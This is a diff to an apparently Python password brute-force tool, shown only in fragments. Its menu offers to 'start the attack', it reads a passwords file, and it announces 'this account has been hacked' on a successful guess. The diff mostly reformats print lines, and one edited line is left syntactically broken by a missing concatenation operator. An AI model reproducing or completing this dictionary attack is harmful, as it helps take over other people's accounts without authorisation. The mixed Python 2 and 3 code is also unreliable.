@@ -36,8 +36,8 @@ def main():
    print ('           ()   V.1.0        ')
 
 main()
-print '[1] start the attack'
-print '[2] exit'
+print ('[1] start the attack')
+print ('[2] exit')
 option = input('==>')
 if option == 1:
    file_path = raw_input('path of passwords file :')
@@ -66,9 +66,9 @@ def login():
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
+            print '[+] this account has been hacked, password :(' + password + ')     ^_^'
 
             break
          else:
-            print '[!] password not found => ' + password
+            print '[!] password not found => (' + password ')
 login()
